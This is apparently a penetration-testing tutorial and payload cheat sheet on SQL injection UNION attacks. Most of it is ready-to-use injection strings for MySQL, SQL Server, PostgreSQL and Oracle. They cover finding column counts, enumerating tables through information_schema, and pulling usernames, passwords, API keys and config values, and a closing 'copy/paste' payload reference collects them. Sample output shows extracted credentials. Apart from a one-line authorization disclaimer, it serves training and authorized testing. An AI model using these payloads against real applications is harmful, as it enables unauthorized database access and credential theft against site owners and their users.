# SQL injection UNION attacks

UNION attacks are the most powerful in-band SQLi technique, allowing direct retrieval of data from any table in the database when query results are returned in the application response. By appending additional `SELECT` statements using `UNION`, you can extract usernames, passwords, API keys, and sensitive data from tables the application never intended to expose.

UNION attacks require meeting specific technical requirements (matching column counts and compatible data types), but once satisfied, they provide complete read access to the database.

> Only test systems you own or are explicitly authorized to assess.

## How UNION attacks work (SQL basics)

The `UNION` operator combines results from multiple `SELECT` queries into a single result set.

Normal UNION query:
```sql
SELECT name, price FROM products WHERE category='Gifts'
UNION
SELECT name, price FROM products WHERE category='Electronics'
```

Returns all products from both categories in a single result.

## Requirements for UNION attacks (critical constraints)

For `UNION` to work, two conditions must be met:

### 1) Column count must match
```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2    -- Works (2 columns each)
SELECT a, b FROM table1 UNION SELECT c, d, e FROM table2 -- ERROR (2 vs 3 columns)
```

### 2) Data types must be compatible
```sql
SELECT name, price FROM products UNION SELECT username, age FROM users    -- Works (string, int)
SELECT name, price FROM products UNION SELECT username, password FROM users  -- Works (string, string)
SELECT id, name FROM products UNION SELECT name, id FROM users    -- Likely ERROR (int vs string in first column)
```

`NULL` is compatible with all data types, which is why it's used for discovery.

## Determining column count (two methods)

### Method 1: ORDER BY technique (cleaner, often preferred)

Inject incrementing `ORDER BY` clauses until you get an error.

Original query:
```sql
SELECT name, description, price FROM products WHERE category='Gifts'
```

Test payloads:
```sql
' ORDER BY 1--    (success - column 1 exists)
' ORDER BY 2--    (success - column 2 exists)
' ORDER BY 3--    (success - column 3 exists)
' ORDER BY 4--    (ERROR - only 3 columns)
```

Error message (SQL Server):
```text
The ORDER BY position number 4 is out of range of the number of items in the select list.
```

Error message (MySQL):
```text
Unknown column '4' in 'order clause'
```

Conclusion: Original query returns **3 columns**.

### Method 2: UNION SELECT NULL technique (more reliable)

Inject `UNION SELECT` with increasing NULL values until query succeeds.

```sql
' UNION SELECT NULL--                    (ERROR if >1 column)
' UNION SELECT NULL,NULL--               (ERROR if >2 columns)
' UNION SELECT NULL,NULL,NULL--          (SUCCESS - 3 columns confirmed)
' UNION SELECT NULL,NULL,NULL,NULL--     (ERROR - too many columns)
```

Error message (if column count wrong):
```text
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
```

Success indicators:
- No error (best case)
- Additional row appears in results
- Response changes noticeably (extra HTML elements, different content length)

**Why use NULL?** NULL converts to any data type, avoiding type compatibility errors during column count discovery.

### Database-specific syntax requirements

#### Oracle (requires FROM clause):
```sql
' UNION SELECT NULL FROM DUAL--
' UNION SELECT NULL,NULL FROM DUAL--
' UNION SELECT NULL,NULL,NULL FROM DUAL--
```

`DUAL` is a built-in Oracle table with one row, used when FROM is required but no real table is needed.

#### MySQL (comment requires space or alternative):
```sql
' UNION SELECT NULL-- -    (note space after --)
' UNION SELECT NULL#       (# is MySQL comment)
```

#### SQL Server / PostgreSQL (standard syntax):
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
```

## Finding string-compatible columns

Once you know the column count, identify which columns accept string data (needed to extract text like usernames/passwords).

Assume we found 4 columns. Test each with a string marker:

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

Observe the response:
- If **'a' appears in the output**, that column displays string data → usable for extraction
- If **error occurs**, that column expects non-string type (int, date, etc.)
- If **no error but 'a' doesn't appear**, column exists but might not be displayed

Error example (type mismatch):
```text
Conversion failed when converting the varchar value 'a' to data type int.
```

Success example (column 2 is string-compatible):
```text
Products:
- Widget (a)     ← 'a' appears in the second column position
- Gadget (desc2)
```

## Extracting data (putting it together)

### Scenario: 
- Original query returns 2 columns (both string-compatible)
- Database has `users` table with `username` and `password` columns

Payload:
```sql
' UNION SELECT username, password FROM users--
```

Full query becomes:
```sql
SELECT name, description FROM products WHERE category='Gifts' 
UNION SELECT username, password FROM users--'
```

Response includes:
```text
Product: Widget - High quality widget
Product: Gadget - Useful gadget
Product: administrator - s3cur3P@ss
Product: wiener - password123
Product: carlos - qwerty
```

### When column counts don't match original query needs

If original query has 4 columns but you only want 2 values from `users`:

```sql
' UNION SELECT username, password, NULL, NULL FROM users--
```

Or if columns 1 and 4 are string-compatible:
```sql
' UNION SELECT username, NULL, NULL, password FROM users--
```

### Extracting from multiple tables

Get usernames and emails:
```sql
' UNION SELECT username, email FROM users--
```

Get API keys:
```sql
' UNION SELECT username, api_key FROM users--
```

Get admin credentials:
```sql
' UNION SELECT username, password FROM users WHERE role='admin'--
```

Get config values:
```sql
' UNION SELECT key_name, key_value FROM config--
```

## Retrieving multiple values in a single column

When only one column is string-compatible, concatenate multiple fields.

### SQL Server:
```sql
' UNION SELECT username + '~' + password FROM users--
' UNION SELECT username + ':' + email + ':' + api_key FROM users--
```

### MySQL:
```sql
' UNION SELECT CONCAT(username, '~', password) FROM users--
' UNION SELECT CONCAT(username, ':', email, ':', api_key) FROM users--
```

### PostgreSQL:
```sql
' UNION SELECT username || '~' || password FROM users--
' UNION SELECT username || ':' || email || ':' || api_key FROM users--
```

### Oracle:
```sql
' UNION SELECT username || '~' || password FROM users--
' UNION SELECT username || ':' || email || ':' || api_key FROM users--
```

Output example:
```text
administrator~s3cure
wiener~peter
carlos~montoya
```

Parse by splitting on the separator (`~` or `:`).

## Complete attack workflow (step-by-step)

### Step 1: Confirm SQLi vulnerability
```sql
'            (triggers error)
' OR '1'='1  (changes behavior)
```

### Step 2: Determine column count
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--    (success)
' ORDER BY 4--    (error → 3 columns)
```

Or:
```sql
' UNION SELECT NULL,NULL,NULL--    (success → 3 columns)
```

### Step 3: Find string-compatible columns
```sql
' UNION SELECT 'test1',NULL,NULL--
' UNION SELECT NULL,'test2',NULL--    (appears in output → column 2 is usable)
' UNION SELECT NULL,NULL,'test3'--
```

Result: Columns 1 and 2 accept strings, column 3 might be numeric.

### Step 4: Enumerate database structure
List tables:
```sql
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
```

List columns for `users` table:
```sql
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
```

### Step 5: Extract target data
```sql
' UNION SELECT username,password,NULL FROM users--
```

### Step 6: If only one string column available
```sql
' UNION SELECT CONCAT(username,':',password),NULL,NULL FROM users--
```

## Advanced extraction techniques

### Extract all data from a table:
```sql
' UNION SELECT username,password,NULL FROM users--
' UNION SELECT email,api_key,NULL FROM users--
```

### Limit results (if too many rows):
```sql
' UNION SELECT username,password,NULL FROM users LIMIT 5--    (MySQL)
' UNION SELECT TOP 5 username,password,NULL FROM users--      (SQL Server)
' UNION SELECT username,password,NULL FROM users WHERE rownum<=5--  (Oracle)
```

### Extract with conditions:
```sql
' UNION SELECT username,password,NULL FROM users WHERE role='admin'--
' UNION SELECT username,password,NULL FROM users WHERE username LIKE 'admin%'--
```

### Group concatenation (all rows in one result):

MySQL:
```sql
' UNION SELECT GROUP_CONCAT(username),GROUP_CONCAT(password),NULL FROM users--
```

Output: `admin,user1,user2` and `pass1,pass2,pass3`

SQL Server:
```sql
' UNION SELECT STRING_AGG(username,','),NULL,NULL FROM users--
```

PostgreSQL:
```sql
' UNION SELECT STRING_AGG(username,','),NULL,NULL FROM users--
```

### Multi-column concatenation in single field:

MySQL:
```sql
' UNION SELECT GROUP_CONCAT(CONCAT(username,':',password) SEPARATOR '<br>'),NULL,NULL FROM users--
```

Output: `admin:pass1<br>user1:pass2<br>user2:pass3`

## Common errors and fixes

### Error: "UNION types X and Y cannot be matched"
**Cause**: Data type mismatch in column
**Fix**: Use NULL for incompatible columns or cast data:
```sql
' UNION SELECT username, CAST(password AS INT), NULL FROM users--  (if column 2 needs int)
```

### Error: "ORA-00933: SQL command not properly ended"
**Cause**: Oracle requires FROM clause
**Fix**: Add `FROM DUAL`:
```sql
' UNION SELECT NULL,NULL FROM DUAL--
```

### Error: No visible output
**Cause**: Injected data not displayed, or rows filtered by app logic
**Fix**: 
- Try different columns
- Use error-based or blind techniques
- Check if response changes at all (length, timing)

### Error: "Column count mismatch"
**Cause**: Wrong number of NULLs
**Fix**: Add/remove NULLs until error disappears:
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

## Quick payload reference (copy/paste)

Determine column count:
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL--
```

Oracle (add FROM DUAL):
```sql
' UNION SELECT NULL FROM DUAL--
' UNION SELECT NULL,NULL FROM DUAL--
```

Find string columns:
```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

Extract usernames and passwords:
```sql
' UNION SELECT username,password FROM users--
' UNION SELECT username,password,NULL FROM users--    (if 3 columns)
```

Extract with concatenation:
```sql
' UNION SELECT CONCAT(username,':',password),NULL FROM users--    (MySQL)
' UNION SELECT username||':'||password,NULL FROM users--          (PostgreSQL/Oracle)
' UNION SELECT username+':'+password,NULL FROM users--            (SQL Server)
```
